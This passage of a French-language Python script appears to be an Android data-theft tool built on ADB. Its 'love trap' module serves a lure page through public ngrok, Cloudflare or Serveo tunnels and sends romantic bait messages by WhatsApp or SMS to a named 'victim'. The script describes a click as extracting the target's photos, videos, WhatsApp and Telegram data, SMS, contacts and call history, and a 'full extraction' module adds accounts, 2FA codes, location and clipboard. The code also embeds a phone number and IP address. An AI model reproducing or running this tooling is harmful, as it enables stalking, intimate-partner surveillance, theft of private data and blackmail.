        if errors > 0:
            print(f"    {C.RED}⚠️  Erreurs: {errors}{C.END}")
        print(f"    {C.CYAN}{'─'*60}{C.END}")
        
        return downloaded_count, downloaded_size
    
    print(f"\n{C.MAGENTA}{'═'*70}{C.END}")
    print(f"{C.BOLD}{C.MAGENTA}📥 DÉBUT DE L'EXTRACTION - 8 CATÉGORIES{C.END}")
    print(f"{C.MAGENTA}{'═'*70}{C.END}")
    
    # 1. PHOTOS
    photos_dir = extraction_dir / "PHOTOS"
    try:
        f1, s1 = extract_with_progress("/sdcard/DCIM", str(photos_dir / "DCIM"), "📸 PHOTOS DCIM", 1, 8)
        f2, s2 = extract_with_progress("/sdcard/Pictures", str(photos_dir / "Pictures"), "📸 PHOTOS Pictures", 1, 8)
        results['photos'] = f"OK ({f1+f2} fichiers)"
    except Exception as e:
        results['photos'] = str(e)
        print(f"\n    {C.RED}✗ Erreur photos: {e}{C.END}")
    
    # 2. VIDÉOS
    videos_dir = extraction_dir / "VIDEOS"
    try:
        f1, s1 = extract_with_progress("/sdcard/Movies", str(videos_dir / "Movies"), "🎬 VIDÉOS Movies", 2, 8)
        f2, s2 = extract_with_progress("/sdcard/DCIM/Camera", str(videos_dir / "Camera"), "🎬 VIDÉOS Camera", 2, 8)
        results['videos'] = f"OK ({f1+f2} fichiers)"
    except Exception as e:
        results['videos'] = str(e)
        print(f"\n    {C.RED}✗ Erreur vidéos: {e}{C.END}")
    
    # 3. WHATSAPP
    wa_dir = extraction_dir / "WHATSAPP"
    try:
        f1, s1 = extract_with_progress("/sdcard/WhatsApp", str(wa_dir / "WhatsApp"), "💬 WHATSAPP Data", 3, 8)
        f2, s2 = extract_with_progress("/sdcard/Android/media/com.whatsapp", str(wa_dir / "Media"), "💬 WHATSAPP Media", 3, 8)
        results['whatsapp'] = f"OK ({f1+f2} fichiers)"
    except Exception as e:
        results['whatsapp'] = str(e)
        print(f"\n    {C.RED}✗ Erreur WhatsApp: {e}{C.END}")
    
    # 4. SMS
    print(f"\n    {C.CYAN}{'─'*60}{C.END}")
    print(f"    {C.BOLD}{C.GREEN}[4/8] 📱 SMS{C.END}")
    print(f"    {C.CYAN}{'─'*60}{C.END}")
    sms_file = extraction_dir / "sms_messages.txt"
    try:
        print(f"    {C.YELLOW}⏳ Extraction des SMS...{C.END}")
        result = subprocess.run(
            f'"{ADB_PATH}" -s {DEVICE} shell content query --uri content://sms',
            shell=True, capture_output=True, text=True, timeout=60
        )
        with open(sms_file, 'w', encoding='utf-8') as f:
            f.write("="*60 + "\n")
            f.write("📱 SMS EXTRAITS - PIÈGE AMOUR\n")
            f.write("="*60 + "\n\n")
            f.write(result.stdout)
        sms_count = result.stdout.count('Row:')
        results['sms'] = f"OK ({sms_count} messages)"
        print(f"    {C.GREEN}✅ {sms_count} SMS extraits{C.END}")
    except Exception as e:
        results['sms'] = str(e)
        print(f"    {C.RED}✗ Erreur SMS: {e}{C.END}")
    
    # 5. CONTACTS
    print(f"\n    {C.CYAN}{'─'*60}{C.END}")
    print(f"    {C.BOLD}{C.GREEN}[5/8] 👥 CONTACTS{C.END}")
    print(f"    {C.CYAN}{'─'*60}{C.END}")
    contacts_file = extraction_dir / "contacts.txt"
    try:
        print(f"    {C.YELLOW}⏳ Extraction des contacts...{C.END}")
        result = subprocess.run(
            f'"{ADB_PATH}" -s {DEVICE} shell content query --uri content://contacts/phones',
            shell=True, capture_output=True, text=True, timeout=60
        )
        with open(contacts_file, 'w', encoding='utf-8') as f:
            f.write("="*60 + "\n")
            f.write("👥 CONTACTS EXTRAITS - PIÈGE AMOUR\n")
            f.write("="*60 + "\n\n")
            f.write(result.stdout)
        contacts_count = result.stdout.count('Row:')
        results['contacts'] = f"OK ({contacts_count} contacts)"
        print(f"    {C.GREEN}✅ {contacts_count} contacts extraits{C.END}")
    except Exception as e:
        results['contacts'] = str(e)
        print(f"    {C.RED}✗ Erreur contacts: {e}{C.END}")
    
    # 6. HISTORIQUE APPELS
    print(f"\n    {C.CYAN}{'─'*60}{C.END}")
    print(f"    {C.BOLD}{C.GREEN}[6/8] 📞 HISTORIQUE APPELS{C.END}")
    print(f"    {C.CYAN}{'─'*60}{C.END}")
    calls_file = extraction_dir / "historique_appels.txt"
    try:
        print(f"    {C.YELLOW}⏳ Extraction de l'historique...{C.END}")
        result = subprocess.run(
            f'"{ADB_PATH}" -s {DEVICE} shell content query --uri content://call_log/calls',
            shell=True, capture_output=True, text=True, timeout=60
        )
        with open(calls_file, 'w', encoding='utf-8') as f:
            f.write("="*60 + "\n")
            f.write("📞 HISTORIQUE APPELS - PIÈGE AMOUR\n")
            f.write("="*60 + "\n\n")
            f.write(result.stdout)
        calls_count = result.stdout.count('Row:')
        results['calls'] = f"OK ({calls_count} appels)"
        print(f"    {C.GREEN}✅ {calls_count} appels extraits{C.END}")
    except Exception as e:
        results['calls'] = str(e)
        print(f"    {C.RED}✗ Erreur appels: {e}{C.END}")
    
    # 7. TELEGRAM
    telegram_dir = extraction_dir / "TELEGRAM"
    try:
        f1, s1 = extract_with_progress("/sdcard/Telegram", str(telegram_dir), "✈️ TELEGRAM", 7, 8)
        results['telegram'] = f"OK ({f1} fichiers)"
    except Exception as e:
        results['telegram'] = str(e)
        print(f"\n    {C.RED}✗ Erreur Telegram: {e}{C.END}")
    
    # 8. AUTRES (Screenshots, Downloads, Documents)
    other_dir = extraction_dir / "AUTRES"
    try:
        f1, s1 = extract_with_progress("/sdcard/Screenshots", str(other_dir / "Screenshots"), "📲 SCREENSHOTS", 8, 8)
        f2, s2 = extract_with_progress("/sdcard/Download", str(other_dir / "Downloads"), "📥 DOWNLOADS", 8, 8)
        f3, s3 = extract_with_progress("/sdcard/Documents", str(other_dir / "Documents"), "📄 DOCUMENTS", 8, 8)
        results['autres'] = f"OK ({f1+f2+f3} fichiers)"
    except Exception as e:
        results['autres'] = str(e)
        print(f"\n    {C.RED}✗ Erreur autres: {e}{C.END}")
    
    # Rapport final avec statistiques
    print(f"\n\n{C.GREEN}{'═'*70}{C.END}")
    print(f"{C.BOLD}{C.GREEN}📊 RAPPORT FINAL DE L'EXTRACTION{C.END}")
    print(f"{C.GREEN}{'═'*70}{C.END}")
    
    report_file = extraction_dir / "RAPPORT_EXTRACTION.txt"
    with open(report_file, 'w', encoding='utf-8') as f:
        f.write("="*60 + "\n")
        f.write("💕 RAPPORT EXTRACTION - PIÈGE AMOUR\n")
        f.write("="*60 + "\n\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Appareil: {DEVICE}\n\n")
        f.write("-"*40 + "\n")
        f.write("RÉSULTATS:\n")
        f.write("-"*40 + "\n")
        for key, value in results.items():
            status = "✓" if "OK" in str(value) else "✗"
            f.write(f"  {status} {key}: {value}\n")
        f.write(f"\nTOTAL: {total_files} fichiers ({total_size/(1024*1024):.1f} MB)\n")
    
    # Affichage du rapport
    print(f"\n    {C.CYAN}📋 RÉSUMÉ:{C.END}")
    for key, value in results.items():
        status_icon = "✅" if "OK" in str(value) else "❌"
        print(f"    {status_icon} {key.upper()}: {value}")
    
    print(f"\n    {C.YELLOW}{'─'*60}{C.END}")
    print(f"    {C.BOLD}{C.MAGENTA}📊 STATISTIQUES TOTALES:{C.END}")
    print(f"    {C.WHITE}    📁 Fichiers extraits: {total_files}{C.END}")
    print(f"    {C.WHITE}    💾 Taille totale: {total_size/(1024*1024):.1f} MB{C.END}")
    print(f"    {C.WHITE}    📂 Dossier: {extraction_dir}{C.END}")
    print(f"    {C.YELLOW}{'─'*60}{C.END}")
    
    print(f"\n{C.GREEN}{'═'*70}{C.END}")
    print(f"{C.BOLD}{C.GREEN}💕 EXTRACTION PIÈGE AMOUR TERMINÉE!{C.END}")
    print(f"{C.GREEN}{'═'*70}{C.END}")
    print(f"\n    {C.CYAN}📁 Toutes les données dans:{C.END}")
    print(f"    {C.WHITE}{extraction_dir}{C.END}\n")

def start_love_trap(port=8889):
    """Démarre le serveur piège amour"""
    global LOVE_TRAP_SERVER, LOVE_TRAP_EXTRACTION_DONE
    
    LOVE_TRAP_EXTRACTION_DONE = False
    
    print(f"\n{C.MAGENTA}{'═'*70}{C.END}")
    print(f"{C.BOLD}{C.MAGENTA}💕 PIÈGE AMOUR - EXTRACTION AUTOMATIQUE{C.END}")
    print(f"{C.MAGENTA}{'═'*70}{C.END}\n")
    
    local_ip = get_local_ip()
    
    try:
        LOVE_TRAP_SERVER = HTTPServer(('0.0.0.0', port), LoveTrapHandler)
        
        print(f"    {C.GREEN}✓ Serveur piège amour démarré sur le port {port}{C.END}\n")
        print(f"    {C.YELLOW}📎 LIEN À ENVOYER:{C.END}")
        print(f"    {C.CYAN}   http://{local_ip}:{port}{C.END}\n")
        print(f"    {C.MAGENTA}💕 Quand la victime clique sur 'Ouvrir mon message':{C.END}")
        print(f"    {C.WHITE}   → Toutes ses PHOTOS sont extraites{C.END}")
        print(f"    {C.WHITE}   → Toutes ses VIDÉOS sont extraites{C.END}")
        print(f"    {C.WHITE}   → Tout WHATSAPP est extrait{C.END}")
        print(f"    {C.WHITE}   → Tous les SMS sont extraits{C.END}")
        print(f"    {C.WHITE}   → Tous les CONTACTS sont extraits{C.END}")
        print(f"    {C.WHITE}   → L'historique des APPELS est extrait{C.END}")
        print(f"    {C.WHITE}   → TELEGRAM est extrait{C.END}")
        print(f"    {C.WHITE}   → Et elle voit un beau message d'amour! 💕{C.END}\n")
        print(f"    {C.RED}⏳ En attente que la victime clique...{C.END}\n")
        
        server_thread = threading.Thread(target=LOVE_TRAP_SERVER.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        return local_ip, port
        
    except OSError as e:
        print_error(f"Erreur: {e}")
        return None, None

# Ton numéro WhatsApp pour envoyer les liens
MY_WHATSAPP_NUMBER = "+2250150252467"

# Chemin vers ngrok et cloudflared
NGROK_PATH = r"C:\Users\davis\OneDrive\Bureau\HACKING\Tools\ngrok.exe"
CLOUDFLARED_PATH = r"C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Cloudflare.cloudflared_Microsoft.Winget.Source_8wekyb3d8bbwe\cloudflared.exe"

def start_cloudflared(port):
    """Démarre cloudflared tunnel (gratuit, sans page d'avertissement)"""
    global NGROK_PROCESS
    
    print(f"\n    {C.CYAN}🌐 DÉMARRAGE DE CLOUDFLARE TUNNEL (sans page d'avertissement)...{C.END}")
    
    # Vérifier que cloudflared existe
    import os
    if not os.path.exists(CLOUDFLARED_PATH):
        print(f"    {C.RED}✗ cloudflared.exe non trouvé à: {CLOUDFLARED_PATH}{C.END}")
        return None, None
    
    print(f"    {C.GREEN}✓ cloudflared trouvé: {CLOUDFLARED_PATH}{C.END}")
    
    try:
        # Tuer les anciens processus
        subprocess.run('taskkill /F /IM cloudflared.exe 2>nul', shell=True, capture_output=True)
        import time
        time.sleep(2)
        
        # Utiliser une méthode différente pour capturer la sortie cloudflared
        # Cloudflared écrit sur stderr, on doit tout capturer
        import threading
        import queue
        
        tunnel_cmd = [CLOUDFLARED_PATH, "tunnel", "--url", f"http://localhost:{port}"]
        print(f"    {C.YELLOW}Commande: {' '.join(tunnel_cmd)}{C.END}")
        
        # Queue pour récupérer l'URL
        url_queue = queue.Queue()
        
        NGROK_PROCESS = subprocess.Popen(
            tunnel_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )
        
        def read_stderr():
            """Lit stderr en continu et cherche l'URL"""
            import re
            for line in NGROK_PROCESS.stderr:
                print(f"    {C.CYAN}[CF] {line.strip()[:70]}{C.END}")
                # Chercher l'URL trycloudflare
                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                if match:
                    url_queue.put(match.group(0))
                    break
        
        # Lancer le thread de lecture
        reader_thread = threading.Thread(target=read_stderr, daemon=True)
        reader_thread.start()
        
        print(f"    {C.YELLOW}⏳ Création du tunnel Cloudflare (patientez ~10 secondes)...{C.END}")
        
        # Attendre l'URL avec timeout
        try:
            url = url_queue.get(timeout=15)
            print(f"\n    {C.GREEN}✓ TUNNEL CLOUDFLARE CRÉÉ AVEC SUCCÈS!{C.END}")
            print(f"    {C.GREEN}🔗 URL DIRECTE (SANS AVERTISSEMENT): {url}{C.END}")
            return url, NGROK_PROCESS
        except queue.Empty:
            print(f"    {C.YELLOW}⚠️ URL Cloudflare non détectée (timeout){C.END}")
            return None, NGROK_PROCESS
        
    except Exception as e:
        print(f"    {C.RED}✗ Erreur Cloudflare: {e}{C.END}")
        return None, None

def start_ngrok(port):
    """Démarre ngrok et retourne l'URL publique"""
    global NGROK_PROCESS
    
    print(f"\n    {C.CYAN}🚀 DÉMARRAGE DE NGROK...{C.END}")
    
    try:
        # Tuer les anciens processus ngrok
        subprocess.run('taskkill /F /IM ngrok.exe 2>nul', shell=True, capture_output=True)
        import time
        time.sleep(1)
        
        # Démarrer ngrok en arrière-plan avec le chemin complet
        # Ajouter --host-header pour éviter l'avertissement
        ngrok_cmd = f'"{NGROK_PATH}" http {port} --log=stdout'
        NGROK_PROCESS = subprocess.Popen(
            ngrok_cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        print(f"    {C.YELLOW}⏳ Connexion à ngrok...{C.END}")
        time.sleep(4)
        
        # Obtenir l'URL via l'API ngrok
        try:
            import urllib.request
            import json
            req = urllib.request.urlopen('http://127.0.0.1:4040/api/tunnels', timeout=10)
            data = json.loads(req.read().decode())
            
            for tunnel in data.get('tunnels', []):
                public_url = tunnel.get('public_url', '')
                if public_url.startswith('https://'):
                    print(f"    {C.GREEN}✓ NGROK CONNECTÉ!{C.END}")
                    print(f"    {C.GREEN}🔗 URL PUBLIQUE: {public_url}{C.END}")
                    return public_url, NGROK_PROCESS
                    
        except Exception as e:
            print(f"    {C.YELLOW}API ngrok pas encore prête, nouvelle tentative...{C.END}")
            time.sleep(3)
            try:
                req = urllib.request.urlopen('http://127.0.0.1:4040/api/tunnels', timeout=10)
                data = json.loads(req.read().decode())
                for tunnel in data.get('tunnels', []):
                    public_url = tunnel.get('public_url', '')
                    if public_url.startswith('https://'):
                        print(f"    {C.GREEN}✓ NGROK CONNECTÉ!{C.END}")
                        print(f"    {C.GREEN}🔗 URL PUBLIQUE: {public_url}{C.END}")
                        return public_url, NGROK_PROCESS
            except:
                pass
        
        # Méthode alternative: lire la sortie
        time.sleep(2)
        
        return None, NGROK_PROCESS
        
    except FileNotFoundError:
        print(f"    {C.RED}✗ ngrok n'est pas installé!{C.END}")
        print(f"    {C.YELLOW}→ Installe avec: winget install ngrok.ngrok{C.END}")
        return None, None
    except Exception as e:
        print(f"    {C.RED}✗ Erreur ngrok: {e}{C.END}")
        return None, None

def create_public_tunnel(port):
    """Crée un tunnel public - NGROK en priorité"""
    print(f"\n    {C.CYAN}🌐 CRÉATION D'UN LIEN PUBLIC AVEC NGROK...{C.END}")
    
    # Méthode 1: NGROK (prioritaire)
    print(f"    {C.YELLOW}Démarrage de ngrok...{C.END}")
    ngrok_url, ngrok_process = start_ngrok(port)
    if ngrok_url:
        # Ajouter le paramètre pour skip la page
        ngrok_url_skip = ngrok_url + "?ngrok-skip-browser-warning=true"
        print(f"    {C.YELLOW}⚠️  Utilise ce lien pour éviter la page ngrok:{C.END}")
        print(f"    {C.GREEN}{ngrok_url_skip}{C.END}")
        return ngrok_url_skip, ngrok_process
    
    # Méthode 3: Serveo (gratuit, sans installation)
    try:
        print(f"    {C.YELLOW}Tentative avec Serveo.net...{C.END}")
        serveo_cmd = f'ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net'
        process = subprocess.Popen(
            serveo_cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        import time
        time.sleep(3)
        
        for line in process.stdout:
            if 'serveo.net' in line:
                url = line.strip()
                if 'https://' in url:
                    print(f"    {C.GREEN}✓ Tunnel créé!{C.END}")
                    return url, process
        
    except Exception as e:
        print(f"    {C.YELLOW}Serveo non disponible: {e}{C.END}")
    
    # Si aucun tunnel ne fonctionne
    tailscale_ip = "100.88.242.60"
    print(f"\n    {C.YELLOW}💡 ALTERNATIVES POUR ACCÈS EXTERNE:{C.END}")
    print(f"    {C.WHITE}   1. Utilise Tailscale: http://{tailscale_ip}:{port}{C.END}")
    print(f"    {C.WHITE}   2. Configure le port forwarding sur ton routeur{C.END}")
    
    return None, None

def send_love_trap_whatsapp():
    """Envoie le lien piège amour via WhatsApp depuis TON numéro"""
    global DEVICE, LOVE_TRAP_SERVER
    
    port = 8889
    local_ip = get_local_ip()
    tailscale_ip = "100.88.242.60"
    
    print(f"\n{C.MAGENTA}{'═'*70}{C.END}")
    print(f"{C.BOLD}{C.MAGENTA}💕 PIÈGE AMOUR - ENVOI VIA WHATSAPP{C.END}")
    print(f"{C.MAGENTA}{'═'*70}{C.END}")
    print(f"\n    {C.CYAN}📱 Ton numéro WhatsApp: {MY_WHATSAPP_NUMBER}{C.END}\n")
    
    # Démarrer le serveur d'abord
    start_love_trap(port)
    
    # Créer automatiquement un lien NGROK public
    print(f"\n    {C.YELLOW}🔗 CRÉATION DU LIEN PUBLIC AVEC NGROK...{C.END}")
    
    public_url, tunnel_process = create_public_tunnel(port)
    
    if public_url:
        link = public_url
        print(f"\n    {C.GREEN}✓ LIEN PUBLIC CRÉÉ: {link}{C.END}")
    else:
        # Fallback options
        print(f"\n    {C.YELLOW}⚠️  Ngrok non disponible, choisis une alternative:{C.END}")
        print(f"    {C.WHITE}1. Réseau local (WiFi): http://{local_ip}:{port}{C.END}")
        print(f"    {C.WHITE}2. Tailscale: http://{tailscale_ip}:{port}{C.END}")
        print(f"    {C.WHITE}3. Entrer un lien personnalisé{C.END}")
        
        alt_choice = input(f"\n    {C.CYAN}Choix [1-3]: {C.END}").strip()
        
        if alt_choice == "1":
            link = f"http://{local_ip}:{port}"
        elif alt_choice == "2":
            link = f"http://{tailscale_ip}:{port}"
        elif alt_choice == "3":
            link = input(f"    {C.CYAN}Entre ton lien: {C.END}").strip()
        else:
            link = f"http://{local_ip}:{port}"
    
    # Messages prédéfinis romantiques
    messages = [
        f"💕 J'ai un petit mot pour toi bébé... {link}",
        f"💝 Mon cœur, j'ai préparé quelque chose de spécial pour toi 💋 {link}",
        f"💖 Surprise mon amour! J'ai quelque chose à te montrer... {link}",
        f"💕 Tu me manques tellement... J'ai écrit quelque chose pour toi {link}",
        f"💘 Ouvre ce lien mon bébé, j'ai un cadeau pour toi 💝 {link}",
        f"❤️ Mon amour, clique ici j'ai une surprise... {link}",
        f"💕 J'ai pensé à toi toute la journée... Regarde ça {link}",
        f"💖 Bébé, j'ai quelque chose d'important à te dire... {link}"
    ]
    
    print(f"\n    {C.YELLOW}💬 MESSAGES PRÉDÉFINIS:{C.END}")
    for i, msg in enumerate(messages, 1):
        preview = msg[:60] + "..." if len(msg) > 60 else msg
        print(f"    {C.WHITE}{i}. {preview}{C.END}")
    print(f"    {C.WHITE}9. Message personnalisé{C.END}")
    
    msg_choice = input(f"\n    {C.CYAN}Choix [1-9]: {C.END}").strip()
    
    if msg_choice == "9":
        custom_msg = input(f"\n    {C.CYAN}Ton message (le lien sera ajouté): {C.END}")
        message = f"{custom_msg} {link}"
    elif msg_choice.isdigit() and 1 <= int(msg_choice) <= 8:
        message = messages[int(msg_choice) - 1]
    else:
        message = messages[0]
    
    # Demander le numéro de la CIBLE (destinataire)
    print(f"\n    {C.YELLOW}📱 NUMÉRO DE LA CIBLE (destinataire):{C.END}")
    target_phone = input(f"    {C.CYAN}Numéro WhatsApp de la cible (ex: +225xxxxxxxx): {C.END}").strip()
    
    if not target_phone:
        print(f"\n    {C.YELLOW}Aucun numéro entré. Voici le lien à envoyer manuellement:{C.END}")
        print(f"\n    {C.CYAN}🔗 {link}{C.END}")
        print(f"\n    {C.WHITE}Message à copier:{C.END}")
        print(f"    {C.GREEN}{message}{C.END}")
    else:
        # Nettoyer le numéro
        target_phone = target_phone.replace("+", "").replace(" ", "").replace("-", "")
        
        # Encoder le message pour URL
        import urllib.parse
        encoded_message = urllib.parse.quote(message)
        
        # Ouvrir WhatsApp avec le message prêt à envoyer depuis TON téléphone
        whatsapp_url = f"https://wa.me/{target_phone}?text={encoded_message}"
        
        print(f"\n    {C.GREEN}📤 OUVERTURE DE WHATSAPP SUR TON TÉLÉPHONE...{C.END}")
        print(f"    {C.WHITE}→ De: {MY_WHATSAPP_NUMBER} (ton numéro){C.END}")
        print(f"    {C.WHITE}→ Vers: +{target_phone} (la cible){C.END}")
        
        # Ouvrir le lien WhatsApp via ADB sur TON téléphone
        cmd = f'am start -a android.intent.action.VIEW -d "{whatsapp_url}"'
        result = adb_shell(cmd)
        
        if result is not None:
            print(f"\n    {C.GREEN}✓ WhatsApp ouvert avec le message!{C.END}")
            print(f"    {C.YELLOW}📱 APPUIE SUR ENVOYER SUR TON TÉLÉPHONE!{C.END}")
        else:
            # Méthode alternative
            escaped_msg = message.replace('"', '\\"').replace("'", "\\'")
            cmd2 = f'am start -a android.intent.action.SEND -t text/plain --es android.intent.extra.TEXT "{escaped_msg}" -p com.whatsapp'
            adb_shell(cmd2)
            print(f"\n    {C.GREEN}✓ WhatsApp ouvert!{C.END}")
            print(f"    {C.YELLOW}📱 Sélectionne le contact et envoie{C.END}")
    
    print(f"\n{C.GREEN}{'═'*70}{C.END}")
    print(f"    {C.BOLD}{C.GREEN}✓ PIÈGE AMOUR ACTIF!{C.END}")
    print(f"{C.GREEN}{'═'*70}{C.END}")
    print(f"\n    {C.YELLOW}🔗 Lien actif: {link}{C.END}")
    print(f"    {C.CYAN}📱 Envoyé depuis: {MY_WHATSAPP_NUMBER}{C.END}")
    print(f"    {C.RED}⏳ En attente que la cible clique...{C.END}")
    print(f"\n    {C.MAGENTA}Quand elle cliquera:{C.END}")
    print(f"    {C.WHITE}   → Elle verra 'JE T'AIME MA FEMME AU FOYER BISOUS' 💕{C.END}")
    print(f"    {C.WHITE}   → Toutes ses données seront extraites automatiquement!{C.END}\n")
    
    input(f"    {C.YELLOW}Appuie sur Entrée quand tu veux arrêter...{C.END}")
    
    if LOVE_TRAP_SERVER:
        LOVE_TRAP_SERVER.shutdown()
        print(f"\n    {C.GREEN}✓ Serveur arrêté{C.END}")

def send_love_trap_sms():
    """Envoie le lien piège amour par SMS"""
    global DEVICE
    
    local_ip, port = start_love_trap()
    
    if not local_ip:
        return
    
    link = f"http://{local_ip}:{port}"
    
    print(f"\n    {C.YELLOW}📱 ENVOYER LE LIEN PAR SMS?{C.END}")
    phone = input("    Numéro de téléphone (ou Entrée pour juste afficher): ").strip()
    
    if phone:
        messages = [
            f"💕 J'ai un petit mot pour toi bébé... Clique ici: {link}",
            f"💝 Mon cœur, j'ai préparé quelque chose pour toi: {link}",
            f"💖 Surprise pour toi mon amour! Ouvre vite: {link}",
            f"💕 Tu me manques... J'ai quelque chose à te dire: {link}"
        ]
        
        print(f"\n    {C.CYAN}Messages prédéfinis:{C.END}")
        for i, msg in enumerate(messages, 1):
            print(f"        {i}. {msg[:50]}...")
        print(f"        5. Message personnalisé")
        
        msg_choice = input("\n    Choix: ").strip()
        
        if msg_choice == "5":
            message = input("    Ton message (utilise {link} pour le lien): ")
            message = message.replace("{link}", link)
        elif msg_choice in ["1", "2", "3", "4"]:
            message = messages[int(msg_choice) - 1]
        else:
            message = messages[0]
        
        # Envoyer via ADB
        escaped_msg = message.replace('"', '\\"')
        cmd = f'am start -a android.intent.action.SENDTO -d sms:{phone} --es sms_body "{escaped_msg}" --ez exit_on_sent true'
        result = adb_shell(cmd)
        
        print_success(f"SMS préparé pour {phone}!")
        print_info("Appuie sur ENVOYER sur le téléphone pour confirmer")
    
    print(f"\n    {C.RED}🎯 En attente... Le lien est:{C.END}")
    print(f"    {C.CYAN}{link}{C.END}\n")
    input(f"    {C.YELLOW}Appuie sur Entrée quand tu veux arrêter...{C.END}")
    
    if LOVE_TRAP_SERVER:
        LOVE_TRAP_SERVER.shutdown()

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 25: EXTRACTION COMPLÈTE
# ═══════════════════════════════════════════════════════════════════════════════

def full_extraction():
    """Extraction complète de toutes les données"""
    print(f"\n{C.RED}{'═'*70}{C.END}")
    print(f"{C.BOLD}{C.RED}💀 EXTRACTION COMPLÈTE - MODE HACKER{C.END}")
    print(f"{C.RED}{'═'*70}{C.END}\n")
    
    print(f"""
    {C.YELLOW}⚠️  Cette fonction extrait TOUTES les données accessibles.
    
    Ceci simule ce qu'un attaquant pourrait voler en quelques minutes
    s'il avait accès à votre téléphone.
    
    Données extraites:
    ✓ SMS (codes 2FA, messages privés)
    ✓ Contacts (carnet d'adresses complet)
    ✓ Historique d'appels
    ✓ Comptes enregistrés (Google, Facebook, etc.)
    ✓ Applications sensibles (banque, crypto, etc.)
    ✓ Photos et vidéos
    ✓ Données WhatsApp
    ✓ Documents
    ✓ Notifications
    ✓ Localisation GPS
    ✓ Réseaux WiFi
    ✓ Informations système
    ✓ Processus en cours{C.END}
    """)
    
    confirm = input(f"\n{C.RED}Continuer? (oui/non): {C.END}")
    if confirm.lower() != 'oui':
        print_info("Annulé")
        return
    
    start_time = time.time()
    results = {}
    
    total_steps = 14
    
    # 1. Infos système
    print(f"\n{C.CYAN}[1/{total_steps}] Informations système...{C.END}")
    results['system'] = get_system_info()
    
    # 2. Comptes
    print(f"\n{C.CYAN}[2/{total_steps}] Comptes enregistrés...{C.END}")
    results['accounts'] = get_accounts()
    
    # 3. Apps sensibles
    print(f"\n{C.CYAN}[3/{total_steps}] Applications sensibles...{C.END}")
    results['sensitive_apps'] = detect_sensitive_apps()
    
    # 4. SMS
    print(f"\n{C.CYAN}[4/{total_steps}] Extraction SMS...{C.END}")
    results['sms'] = extract_sms()
    
    # 5. Contacts
    print(f"\n{C.CYAN}[5/{total_steps}] Extraction contacts...{C.END}")
    results['contacts'] = extract_contacts()
    
    # 6. Appels
    print(f"\n{C.CYAN}[6/{total_steps}] Historique appels...{C.END}")
    results['calls'] = extract_call_history()
    
    # 7. Screenshot
    print(f"\n{C.CYAN}[7/{total_steps}] Capture d'écran...{C.END}")
    results['screenshot'] = take_screenshot()
    
    # 8. Notifications
    print(f"\n{C.CYAN}[8/{total_steps}] Notifications...{C.END}")
    results['notifications'] = get_notifications()
    
    # 9. GPS
    print(f"\n{C.CYAN}[9/{total_steps}] Localisation...{C.END}")
    results['location'] = get_location()
    
    # 10. WiFi
    print(f"\n{C.CYAN}[10/{total_steps}] Réseaux WiFi...{C.END}")
    get_wifi_networks()
    
    # 11. Apps
    print(f"\n{C.CYAN}[11/{total_steps}] Applications...{C.END}")
    results['apps'] = list_apps()
    
    # 12. Processus
    print(f"\n{C.CYAN}[12/{total_steps}] Processus en cours...{C.END}")
    get_running_processes()
    
    # 13. Clipboard
    print(f"\n{C.CYAN}[13/{total_steps}] Presse-papiers...{C.END}")
    results['clipboard'] = get_clipboard()
    
    # 14. Photos/WhatsApp (optionnel)
    download_choice = input(f"\n{C.YELLOW}[14/{total_steps}] Télécharger photos/WhatsApp? (oui/non): {C.END}")
    if download_choice.lower() == 'oui':
        download_photos()
        download_whatsapp()
        download_documents()
    
    # Résumé
    elapsed = time.time() - start_time
    
    print(f"\n{C.GREEN}{'═'*70}{C.END}")
    print(f"{C.BOLD}{C.GREEN}✅ EXTRACTION TERMINÉE{C.END}")
    print(f"{C.GREEN}{'═'*70}{C.END}\n")
    
    sensitive_count = sum(len(apps) for apps in results.get('sensitive_apps', {}).values())
    
    print(f"""
    📊 RÉSUMÉ DE L'EXTRACTION:
    
    ✓ Comptes extraits: {len(results.get('accounts', []))}
    ✓ SMS extraits: {results.get('sms', 'N/A')}
    ✓ Contacts extraits: {results.get('contacts', 'N/A')}
    ✓ Appels extraits: {results.get('calls', 'N/A')}
    ✓ Applications: {len(results.get('apps', []))}
    ✓ Apps sensibles: {sensitive_count}
    ✓ Notifications: {results.get('notifications', 'N/A')}
    
    ⏱️  Durée: {elapsed:.1f} secondes
    📁 Données sauvegardées dans: {OUTPUT_BASE}
    
    {C.RED}⚠️  Ces données sont TRÈS sensibles!{C.END}
    {C.RED}   Un attaquant pourrait:{C.END}
    {C.RED}   - Usurper votre identité{C.END}
    {C.RED}   - Vider vos comptes bancaires{C.END}
    {C.RED}   - Accéder à vos conversations privées{C.END}
    {C.RED}   - Vous faire chanter avec vos photos{C.END}
    """)
    
    # Générer un rapport JSON
    report = {
        "timestamp": datetime.now().isoformat(),
        "device": DEVICE,
        "duration_seconds": elapsed,
        "summary": {
            "accounts": len(results.get('accounts', [])),
            "sms": results.get('sms', 0),
            "contacts": results.get('contacts', 0),
            "calls": results.get('calls', 0),
            "apps": len(results.get('apps', [])),
            "sensitive_apps": sensitive_count
        }
    }
    
    with open(OUTPUT_BASE / "extraction_report.json", "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    
    print_success("Rapport sauvegardé: extraction_report.json")
    
    return results

# ═══════════════════════════════════════════════════════════════════════════════
# MENU PRINCIPAL
# ═══════════════════════════════════════════════════════════════════════════════

def show_menu():
    clear()
    print(f"""
{C.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║     ███╗   ███╗███████╗ ██████╗  █████╗     ██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗║
║     ████╗ ████║██╔════╝██╔════╝ ██╔══██╗    ██╔══██╗██║  ██║██╔═══██╗████╗  ██║║
║     ██╔████╔██║█████╗  ██║  ███╗███████║    ██████╔╝███████║██║   ██║██╔██╗ ██║║
